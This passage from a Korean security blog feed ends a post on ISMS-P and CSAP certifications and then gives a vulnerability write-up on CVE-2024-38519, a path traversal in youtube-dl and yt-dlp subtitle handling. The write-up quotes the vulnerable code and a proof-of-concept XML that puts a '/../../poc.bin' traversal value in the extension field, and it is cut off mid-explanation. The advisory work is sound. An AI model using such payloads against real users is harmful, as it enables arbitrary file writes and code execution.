&#xD3C9;&#xAC00;&#xBD84;&#xC57C;&#xC5D0; &#xB300;&#xD574; &#xCD1D; 85&#xAC1C;</strong>&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/07/21/romi0x/certification_privacy/image9.png" alt="&#xC0AC;&#xC9C4;"><br><img src="/2024/07/21/romi0x/certification_privacy/image10.png" alt="&#xC0AC;&#xC9C4;"><br><a href="https://isms.kisa.or.kr/main/ispims/notice/">&#xC0AC;&#xC9C4; &#xCD9C;&#xCC98;</a></p><p>  &#xD574;&#xB2F9; &#xD56D;&#xBAA9;&#xB4E4;&#xC758; &#xD3C9;&#xAC00; &#xD56D;&#xBAA9;&#xC5D0; &#xB300;&#xD55C; <strong>&#xD3C9;&#xAC00; &#xAE30;&#xC900;&#xC740; 4&#xAC00;&#xC9C0;</strong>&#xB85C; &#xB098;&#xB220; &#xD3C9;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;.<br><img src="/2024/07/21/romi0x/certification_privacy/012.png" alt="&#xC0AC;&#xC9C4;"></p><p>&#xD3C9;&#xAC00;&#xD56D;&#xBAA9;&#xBCC4; &#xD3C9;&#xAC00;&#xB294; &#xC0C1;&#xC138;&#xD55C; &#xADFC;&#xAC70;&#xC640; &#xD568;&#xAED8; &#xD3C9;&#xAC00;(&#xBD80;&#xBD84;&#xC774;&#xD589;, &#xBBF8;&#xC774;&#xD589;, &#xC774;&#xD589;, &#xD574;&#xB2F9; &#xC5C6;&#xC74C;)&#xD55C; &#xD6C4;, &#xC0C1;&#xC138;&#xD55C; &#xC0AC;&#xC720; &#xBC0F; &#xC99D;&#xAC70; &#xC790;&#xB8CC;&#xB97C; &#xAC19;&#xC774; &#xC81C;&#xC2DC;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ul><h2 id="&#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xBCF4;&#xC548;"><a href="#&#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xBCF4;&#xC548;" class="headerlink" title="&#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xBCF4;&#xC548;"></a>&#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xBCF4;&#xC548;</h2><h3 id="1&#xFE0F;&#x20E3;-&#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xBCF4;&#xC548;&#xC778;&#xC99D;&#xC81C;-CSAP-Cloud-Security-Assurance-Program"><a href="#1&#xFE0F;&#x20E3;-&#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xBCF4;&#xC548;&#xC778;&#xC99D;&#xC81C;-CSAP-Cloud-Security-Assurance-Program" class="headerlink" title="1&#xFE0F;&#x20E3; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xBCF4;&#xC548;&#xC778;&#xC99D;&#xC81C;(CSAP, Cloud Security Assurance Program)"></a>1&#xFE0F;&#x20E3; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xBCF4;&#xC548;&#xC778;&#xC99D;&#xC81C;(CSAP, Cloud Security Assurance Program)</h3><p><img src="/2024/07/21/romi0x/certification_privacy/image11.png" alt="&#xC0AC;&#xC9C4;"></p><ul><li>&#xC815;&#xC758;<ul><li>&#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xC11C;&#xBE44;&#xC2A4; &#xC81C;&#xACF5;&#xC790;&#xAC00; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xB300;&#xD574; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xC218;&#xC900;&#xC758; &#xD5A5;&#xC0C1; &#xBC0F; &#xBCF4;&#xC7A5;&#xC744; &#xC704;&#xD558;&#xC5EC; &#xBCF4;&#xC548;&#xC778;&#xC99D;&#xAE30;&#xC900;&#xC5D0; &#xC801;&#xD569;&#xD55C; <strong>&#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xCEF4;&#xD4E8;&#xD305;&#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xB300;&#xD558;&#xC5EC; &#xBCF4;&#xC548;&#xC778;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xC81C;&#xB3C4;&#xC785;&#xB2C8;&#xB2E4;.</strong></li><li>&#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xCEF4;&#xD4E8;&#xD305;&#xC11C;&#xBE44;&#xC2A4;&#xC758; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xC218;&#xC900; &#xD5A5;&#xC0C1; &#xBC0F; &#xBCF4;&#xC7A5;&#xC744; &#xC704;&#xD558;&#xC5EC; &#xACFC;&#xD559;&#xAE30;&#xC220;&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xBD80;&#xAC00; &#xBCF4;&#xC548;&#xC778;&#xC99D;&#xAE30;&#xC900;&#xC5D0; &#xC801;&#xD569;&#xD55C; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xCEF4;&#xD4E8;&#xD305;&#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xB300;&#xD558;&#xC5EC; &#xC778;&#xC99D;&#xD558;&#xB294; &#xC81C;&#xB3C4;&#xC785;&#xB2C8;&#xB2E4;.</li></ul></li><li><p>&#xC778;&#xC99D; &#xCD94;&#xC9C4; &#xAE30;&#xAD00;</p><p>&#xAD00;&#xB828; &#xAE30;&#xAD00;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC544;&#xC694;.</p>  <table>    <tr>      <td>&#xC815;&#xCC45;&#xAE30;&#xAD00;</td>      <td>        <a href="https://www.msit.go.kr/">&#xACFC;&#xD559;&#xAE30;&#xC220;&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xBD80;</a>      </td>    </tr>    <tr>      <td>&#xC778;&#xC99D;&#xAE30;&#xAD00;</td>      <td>        <a href="https://www.kisa.or.kr/">&#xD55C;&#xAD6D;&#xC778;&#xD130;&#xB137;&#xC9C4;&#xD765;&#xC6D0;(KISA)</a>      </td>    </tr>    <tr>  <td>&#xC2EC;&#xC0AC;&#xAE30;&#xAD00;</td>  <td>    <a href="https://www.kait.or.kr/">&#xD55C;&#xAD6D;&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xC9C4;&#xD765;&#xD611;&#xD68C;(KAIT)</a>  </td></tr>  </table><p>  <img src="/2024/07/21/romi0x/certification_privacy/image12.png" alt="&#xC0AC;&#xC9C4;"><br><a href="https://isms.kisa.or.kr/main/csap/intro/">&#xC0AC;&#xC9C4; &#xCD9C;&#xCC98;</a></p></li><li><p>&#xCD94;&#xC9C4; &#xADFC;&#xAC70;</p><ul><li>&#x300C;&#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xCEF4;&#xD4E8;&#xD305; &#xBC1C;&#xC804; &#xBC0F; &#xC774;&#xC6A9;&#xC790; &#xBCF4;&#xD638;&#xC5D0; &#xAD00;&#xD55C; &#xBC95;&#xB960;&#x300D; <ul><li>&#xC81C;5&#xC870;&#xC5D0; &#xC758;&#xD55C; &#x300C;&#xC81C;1&#xCC28; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xCEF4;&#xD4E8;&#xD305; &#xAE30;&#xBCF8;&#xACC4;&#xD68D;&#x300D;(2015)&#xC5D0; &#xB530;&#xB978; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xC11C;&#xBE44;&#xC2A4; &#xBCF4;&#xC548;&#xC778;&#xC99D;&#xC81C;&#xB3C4; &#xC2DC;&#xD589;</li><li>&#xC81C;23&#xC870;&#xC758;2&#xC5D0; &#xB530;&#xB77C; &#xBCF4;&#xC548;&#xC778;&#xC99D;&#xC5D0; &#xAD00;&#xD55C; &#xC5C5;&#xBB34; &#xC218;&#xD589;</li></ul></li></ul></li><li><p>&#xC778;&#xC99D; &#xB300;&#xC0C1;</p><ul><li><p>&#xC778;&#xC99D;&#xB300;&#xC0C1;&#xC740; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xC11C;&#xBE44;&#xC2A4;(IaaS, PaaS, SaaS &#xB4F1;) &#xC81C;&#xACF5; &#xC0AC;&#xC5C5;&#xC790;&#xC785;&#xB2C8;&#xB2E4;. </p><ul><li>IaaS(Infra as a Service)<ul><li>&#xC11C;&#xBC84;, &#xC2A4;&#xD1A0;&#xB9AC;&#xC9C0; &#xB4F1; IT &#xC778;&#xD504;&#xB77C;&#xB97C; &#xC11C;&#xBE44;&#xC2A4; &#xC81C;&#xACF5;</li></ul></li><li>SaaS(Software as a Service)<ul><li>&#xC751;&#xC6A9;SW&#xB97C; &#xC11C;&#xBE44;&#xC2A4;&#xB85C; &#xC81C;&#xACF5;</li></ul></li><li>DaaS(Dsktop as a Service)<ul><li>&#xB370;&#xC2A4;&#xD06C;&#xD0D1;(PC)&#xC744; &#xC11C;&#xBE44;&#xC2A4;&#xB85C; &#xC81C;&#xACF5;</li></ul></li></ul></li></ul></li><li><p>&#xBCF4;&#xC548; &#xC778;&#xC99D; &#xC720;&#xD615;</p><p>&#xBCF4;&#xC548; &#xC778;&#xC99D; &#xC720;&#xD615;&#xC740; &#xCD5C;&#xCD08;&#xD3C9;&#xAC00;, &#xC0AC;&#xD6C4;&#xD3C9;&#xAC00;, &#xAC31;&#xC2E0;&#xD3C9;&#xAC00;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC838; &#xC788;&#xC5B4;&#xC694;.<br><img src="/2024/07/21/romi0x/certification_privacy/image13.png" alt="&#xC0AC;&#xC9C4;"><br><a href="https://isms.kisa.or.kr/main/csap/intro/">&#xC0AC;&#xC9C4; &#xCD9C;&#xCC98;</a></p><ul><li>&#xCD5C;&#xCD08;&#xD3C9;&#xAC00;<ul><li>&#xCC98;&#xC74C;&#xC73C;&#xB85C; &#xC778;&#xC99D;&#xC744; &#xC2E0;&#xCCAD;&#xD558;&#xAC70;&#xB098;, &#xC778;&#xC99D;&#xBC94;&#xC704;&#xC5D0; &#xC911;&#xC694;&#xD55C; &#xBCC0;&#xACBD;&#xC774; &#xC788;&#xC5B4; &#xB2E4;&#xC2DC; &#xC778;&#xC99D;&#xC744; &#xC2E0;&#xCCAD;&#xD55C; &#xB54C;&#xC5D0; &#xC2E4;&#xC2DC;&#xD558;&#xB294; &#xD3C9;&#xAC00;</li><li>&#xCD5C;&#xCD08;&#xD3C9;&#xAC00;&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC99D;&#xC744; &#xCDE8;&#xB4DD;&#xD558;&#xBA74;, <strong>5&#xB144;&#xC758; &#xC720;&#xD6A8;&#xAE30;&#xAC04;</strong>&#xC744; &#xBD80;&#xC5EC; </li></ul></li><li>&#xC0AC;&#xD6C4;&#xD3C9;&#xAC00;<ul><li>&#xBCF4;&#xC548;&#xC778;&#xC99D;&#xC744; &#xCDE8;&#xB4DD;&#xD55C; &#xC774;&#xD6C4; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xC11C;&#xBE44;&#xC2A4; &#xBCF4;&#xC548;&#xC778;&#xC99D;&#xAE30;&#xC900;&#xC744; &#xC900;&#xC218;&#xD558;&#xACE0; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD3C9;&#xAC00;</li><li>&#xBCF4;&#xC548;&#xC778;&#xC99D; <strong>&#xC720;&#xD6A8;&#xAE30;&#xAC04;(5&#xB144;) &#xC548;&#xC5D0; &#xB9E4;&#xB144; &#xC2DC;&#xD589;</strong></li></ul></li><li>&#xAC31;&#xC2E0;&#xD3C9;&#xAC00;<ul><li>&#xBCF4;&#xC548;&#xC778;&#xC99D; &#xC720;&#xD6A8;&#xAE30;&#xAC04;(5&#xB144;)&#xC774; &#xB9CC;&#xB8CC;&#xB418;&#xAE30; &#xC804;&#xC5D0; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xB300;&#xD55C; &#xBCF4;&#xC548;&#xC778;&#xC99D;&#xC758; &#xC5F0;&#xC7A5;&#xC744; &#xC6D0;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xC5D0; &#xC2E4;&#xC2DC;&#xD558;&#xB294; &#xD3C9;&#xAC00;</li><li>&#xAC31;&#xC2E0;&#xD3C9;&#xAC00;&#xB97C; &#xD1B5;&#xACFC;&#xD558;&#xB294; &#xACBD;&#xC6B0;, <strong>5&#xB144;&#xC758; &#xC720;&#xD6A8;&#xAE30;&#xAC04;</strong>&#xC744; &#xB2E4;&#xC2DC; &#xBD80;&#xC5EC;</li></ul></li></ul></li><li><p>&#xC778;&#xC99D; &#xAE30;&#xC900;</p><ul><li><p>&#xAE30;&#xC874; &#xBCF4;&#xC548;&#xC778;&#xC99D;&#xC81C;&#xB3C4;&#xC758; &#xC720;&#xD615;&#xC5D0; &#xB530;&#xB978; &#xBCF4;&#xC548;&#xC778;&#xC99D;&#xAE30;&#xC900;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>  &#xC778;&#xC99D; &#xC720;&#xD615;&#xBCC4; &#xC778;&#xC99D; &#xAE30;&#xC900;&#xC774; &#xAD81;&#xAE08;&#xD558;&#xB2E4;&#xBA74; <a href="https://isms.kisa.or.kr/main/csap/notice/">&#xB9C1;&#xD06C;</a>&#xB97C; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC138;&#xC694;!<br><img src="/2024/07/21/romi0x/certification_privacy/013.png" alt="&#xC0AC;&#xC9C4;"></p></li></ul></li></ul><h3 id="&#xCC38;&#xACE0;-&#xC790;&#xB8CC;"><a href="#&#xCC38;&#xACE0;-&#xC790;&#xB8CC;" class="headerlink" title="&#xCC38;&#xACE0; &#xC790;&#xB8CC;"></a>&#xCC38;&#xACE0; &#xC790;&#xB8CC;</h3><p><a href="https://isms.kisa.or.kr/main/">&#xD55C;&#xAD6D;&#xC778;&#xD130;&#xB137;&#xC9C4;&#xD765;&#xC6D0;(KISA)</a></p><p><a href="https://isms.kisa.or.kr/main/csap/notice/?boardId=bbs_0000000000000004&amp;mode=view&amp;cntId=62">&#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xC11C;&#xBE44;&#xC2A4; &#xBCF4;&#xC548;&#xC778;&#xC99D;&#xC81C; &#xC548;&#xB0B4;&#xC11C;(2023.03)</a></p><p><a href="https://www.openads.co.kr/content/contentDetail?contsId=9604">https://www.openads.co.kr/content/contentDetail?contsId=9604</a></p><p><a href="https://www.fsec.or.kr/bbs/1007">https://www.fsec.or.kr/bbs/1007</a></p><p><a href="https://isms.kisa.or.kr/main/csap/notice/">https://isms.kisa.or.kr/main/csap/notice/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/Certification/">Certification</category>
      
      
      <comments>https://hackyboiz.github.io/2024/07/21/romi0x/certification_privacy/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-38519 : youtube-dl 및 yt-dlp의 Path Traversal로 인한 RCE</title>
      <link>https://hackyboiz.github.io/2024/07/17/l0ch/2024-07-17/</link>
      <guid>https://hackyboiz.github.io/2024/07/17/l0ch/2024-07-17/</guid>
      <pubDate>Wed, 17 Jul 2024 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2024-089_y</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2024-089_youtube-dl/">https://securitylab.github.com/advisories/GHSL-2024-089_youtube-dl/</a></p><p><a href="https://securitylab.github.com/advisories/GHSL-2024-090_yt-dlp/">https://securitylab.github.com/advisories/GHSL-2024-090_yt-dlp/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>youtube-dl<ul><li>nightly release &lt; v2024.07.03</li><li>official release &#xBAA8;&#xB4E0; &#xBC84;&#xC804;</li></ul></li><li>yt-dlp<ul><li>official release &lt; v2024.07.01</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>youtube-dl&#xC740; &#xC720;&#xD29C;&#xBE0C;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xB3D9;&#xC601;&#xC0C1; &#xD638;&#xC2A4;&#xD305; &#xC0AC;&#xC774;&#xD2B8;&#xC758; &#xB3D9;&#xC601;&#xC0C1;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xB294; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;. &#xACF5;&#xC2DD; &#xBC84;&#xC804;&#xC740; 2021&#xB144; 12&#xC6D4; 17&#xC77C; &#xC774;&#xD6C4;&#xB85C; &#xC720;&#xC9C0;&#xBCF4;&#xC218;&#xB418;&#xC9C0;&#xB294; &#xC54A;&#xC73C;&#xB098;, <a href="https://github.com/ytdl-org/ytdl-nightly">ytdl-nightly</a> &#xC800;&#xC7A5;&#xC18C;&#xC5D0;&#xC11C; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>yt-dlp&#xB294; youtube-dl&#xC758; fork&#xB85C;, youtube-dl &#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xC911;&#xB2E8; &#xC774;&#xD6C4;&#xB85C; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB2E4;&#xC6B4;&#xB85C;&#xB354;&#xC774;&#xBA70; &#xC57D; 76,000&#xC758; star&#xB97C; &#xBC1B;&#xB294; &#xB4F1; &#xC778;&#xAE30;&#xC788;&#xB294; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xC911; &#xD558;&#xB098;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xB450; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC5D0;&#xC11C; &#xC790;&#xB9C9; &#xD30C;&#xC77C; &#xD655;&#xC7A5;&#xC790; &#xAC80;&#xC99D; &#xBBF8;&#xD761;&#xC73C;&#xB85C; &#xC778;&#xD55C; Path Traversal &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>yt-dlp &#xBC0F; youtube-dl(&#xC774;&#xD558; yt-dlp)&#xC740; &#xC601;&#xC0C1;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; <code>--write-subs</code>, <code>--write-auto-subs</code>,  <code>--all-subs</code>, <code>--write-srt</code>(only yt-dlp) &#xC635;&#xC158;&#xC744; &#xD1B5;&#xD574; &#xC790;&#xB9C9; &#xB610;&#xD55C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC9C0;&#xC6D0;&#xB418;&#xB294; &#xB3D9;&#xC601;&#xC0C1; &#xD638;&#xC2A4;&#xD305; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xB9C8;&#xB2E4; <a href="https://github.com/yt-dlp/yt-dlp/tree/master/yt_dlp/extractor">&#xC804;&#xC6A9; &#xC790;&#xB9C9; extractor</a>&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC790;&#xB9C9; &#xCD94;&#xCD9C; &#xACFC;&#xC815;&#xC740; &#xAC01; extractor &#xAD6C;&#xD604; &#xBC29;&#xC2DD;&#xC5D0; &#xB530;&#xB77C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC5EC;&#xB7EC; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>extractor&#xAC00; &#xC790;&#xB9C9;&#xC758; URL&#xB9CC; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xACBD;&#xC6B0;<ul><li>yt-dlp core&#xAC00; &#xC9C1;&#xC811; URL&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xC790;&#xB9C9;&#xC758; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xD655;&#xC778;&#xD568;</li></ul></li><li><p>extractor&#xAC00; URL &#xBC0F; &#xC790;&#xB9C9; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xACBD;&#xC6B0;</p><ul><li><p>&#xC77C;&#xBD80; extractor&#xB294; &#xCD94;&#xCD9C;&#xB41C; &#xC790;&#xB9C9; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xAC80;&#xC99D;&#xD568;.</p><pre><code class="hljs python"><span class="hljs-comment"># anvato.py</span>a_caption = {    <span class="hljs-string">&apos;url&apos;</span>: caption[<span class="hljs-string">&apos;url&apos;</span>],    <span class="hljs-string">&apos;ext&apos;</span>: <span class="hljs-string">&apos;tt&apos;</span> <span class="hljs-keyword">if</span> caption.get(<span class="hljs-string">&apos;format&apos;</span>) == <span class="hljs-string">&apos;SMPTE-TT&apos;</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>}subtitles.setdefault(caption[<span class="hljs-string">&apos;language&apos;</span>], []).append(a_caption)</code></pre></li><li><p>&#xC77C;&#xBD80; extractor&#xB294; &#xCD94;&#xCD9C;&#xB41C; &#xC790;&#xB9C9; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC74C;</p><pre><code class="hljs python"><span class="hljs-comment"># microsoftvirtualacademy.py</span>subtitles.setdefault(<span class="hljs-string">&apos;en&apos;</span>, []).append({    <span class="hljs-string">&apos;url&apos;</span>: <span class="hljs-string">&apos;%s/%s&apos;</span> % (base_url, subtitle_url),    <span class="hljs-string">&apos;ext&apos;</span>: source.get(<span class="hljs-string">&apos;type&apos;</span>),})</code></pre></li></ul></li></ol><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; yt-dlp&#xAC00; &#xC790;&#xB9C9; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xB294; 2&#xBC88; &#xB3D9;&#xC791; &#xBC29;&#xC2DD;&#xC758; extractor&#xC5D0;&#xC11C; &#xC790;&#xB9C9;&#xC744; &#xBE4C;&#xB4DC;&#xD560;&#xB584; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">    <span class="hljs-keyword">for</span> sub_lang, sub_info <span class="hljs-keyword">in</span> subtitles.items():      sub_format = sub_info[<span class="hljs-string">&apos;ext&apos;</span>]      sub_filename = subtitles_filename(filename, sub_lang, sub_format, info_dict.get(<span class="hljs-string">&apos;ext&apos;</span>)) <span class="hljs-comment"># &lt;------------- [1]</span>      sub_filename_final = subtitles_filename(sub_filename_base, sub_lang, sub_format, info_dict.get(<span class="hljs-string">&apos;ext&apos;</span>))      existing_sub = self.existing_file((sub_filename_final, sub_filename))      <span class="hljs-keyword">if</span> existing_sub:          self.to_screen(<span class="hljs-string">f&apos;[info] Video subtitle <span class="hljs-subst">{sub_lang}</span>.<span class="hljs-subst">{sub_format}</span> is already present&apos;</span>)          sub_info[<span class="hljs-string">&apos;filepath&apos;</span>] = existing_sub          ret.append((existing_sub, sub_filename_final))          <span class="hljs-keyword">continue</span>      self.to_screen(<span class="hljs-string">f&apos;[info] Writing video subtitles to: <span class="hljs-subst">{sub_filename}</span>&apos;</span>)<span class="hljs-comment">#...</span>      <span class="hljs-keyword">try</span>:          sub_copy = sub_info.copy()          sub_copy.setdefault(<span class="hljs-string">&apos;http_headers&apos;</span>, info_dict.get(<span class="hljs-string">&apos;http_headers&apos;</span>))          self.dl(sub_filename, sub_copy, subtitle=<span class="hljs-literal">True</span>) <span class="hljs-comment"># &lt;------------- [2]</span>          sub_info[<span class="hljs-string">&apos;filepath&apos;</span>] = sub_filename          ret.append((sub_filename, sub_filename_final))<span class="hljs-comment">#...</span></code></pre><p>yt-dlp&#xB294; [1]&#xC5D0;&#xC11C; extractor&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD55C; &#xC790;&#xB9C9; &#xD655;&#xC7A5;&#xC790; <code>sub_info[&apos;exe&apos;]</code>&#xB97C; &#xC2E0;&#xB8B0;&#xD558;&#xACE0; &#xBCC4;&#xB2E4;&#xB978; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xCD9C;&#xB825;&#xD560; &#xC790;&#xB9C9;&#xD30C;&#xC77C;&#xC758; &#xC774;&#xB984; <code>sub_filename</code> &#xC744; &#xAD6C;&#xC131;&#xD558;&#xACE0;, [2]&#xC5D0;&#xC11C; &#xAD6C;&#xC131;&#xB41C; &#xC790;&#xB9C9;&#xD30C;&#xC77C; &#xC774;&#xB984;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xBE4C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xCEE4;&#xB294; &#xD30C;&#xC77C; &#xD655;&#xC7A5;&#xC790;&#xC5D0; path traversal payload&#xB97C; &#xC0BD;&#xC785;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; sub_filename&#xC740; <code>[title][id].[sub_lang].[sub_format]</code> &#xB85C;, &#xD655;&#xC7A5;&#xC790;&#xAC00; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; &#xAD6C;&#xC131;&#xB418;&#xC5B4; <code>[not_existing_path]/../../../[payload]</code>  &#xC640; &#xAC19;&#xC774; &#xAD6C;&#xC131; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xACBD;&#xB85C;&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB294; Linux&#xC5D0;&#xC11C;&#xB294; &#xC791;&#xB3D9;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xB098; Windows&#xC5D0;&#xC11C;&#xB294; &#xC791;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/07/17/l0ch/2024-07-17/Untitled.png" alt="Untitled"></p><pre><code class="hljs python">&lt;videoSettings version=<span class="hljs-string">&quot;1.5&quot;</span>&gt;  &lt;PlaylistItems&gt;    &lt;PlaylistItem&gt;      &lt;MediaSources videoType=&quot;progressive&quot;&gt;&#xFEFF;&lt;MediaSource videoMode=&quot;720p&quot; mimeType=&quot;video/mp4&quot; codec=&quot;avc1.42E01E,mp4a.40.2&quot; default=&quot;true&quot;&gt;http://video.ch9.ms/ch9/1089/193d8990-f065-432e-87d7-981c61e41089/636AzureFundamentalsVM01_high.mp4&lt;/MediaSource&gt;&#xFEFF;&lt;MediaSource videoMode=&quot;540p&quot; mimeType=&quot;video/mp4&quot; codec=&quot;avc1.42E01E,mp4a.40.2&quot; default=&quot;false&quot;&gt;http://video.ch9.ms/ch9/1089/193d8990-f065-432e-87d7-981c61e41089/636AzureFundamentalsVM01_mid.mp4&lt;/MediaSource&gt;&#xFEFF;&lt;MediaSource videoMode=&quot;360p&quot; mimeType=&quot;video/mp4&quot; codec=&quot;avc1.42E01E,mp4a.40.2&quot; default=&quot;false&quot;&gt;https://sec.ch9.ms/ch9/1089/193d8990-f065-432e-87d7-981c61e41089/636AzureFundamentalsVM01.mp4&lt;/MediaSource&gt;&lt;/MediaSources&gt;      &lt;MediaSource /&gt;      &lt;Title&gt;01 | Introduction&lt;/Title&gt;      &lt;MarkerResourceSource type=&quot;/../../poc.bin&quot;&gt;content/content_gfvxismeb_6804984382/subtitles&lt;/MarkerResourceSource&gt;      &lt;ThumbSource /&gt;    &lt;/PlaylistItem&gt;  &lt;/PlaylistItems&gt;&lt;/videoSettings&gt;</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC704;&#xC640; &#xAC19;&#xC774; &#xCD94;&#xCD9C; &#xD0C0;&#xAC9F;&#xC774; &#xB420; XML&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xD638;&#xC2A4;&#xD305;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; 